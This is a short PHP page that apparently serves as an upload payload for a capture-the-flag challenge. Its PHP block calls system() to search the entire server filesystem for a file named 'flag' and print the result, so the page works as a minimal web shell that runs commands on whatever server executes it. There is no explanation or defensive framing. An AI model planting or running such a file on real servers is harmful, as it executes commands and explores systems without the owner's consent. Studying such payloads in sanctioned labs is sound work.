<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
</form>
<pre>
    <?php
        system("find / -name 'flag' 2>/dev/null", $result);
        echo $result;
    ?>
</pre>
</body>
</html>
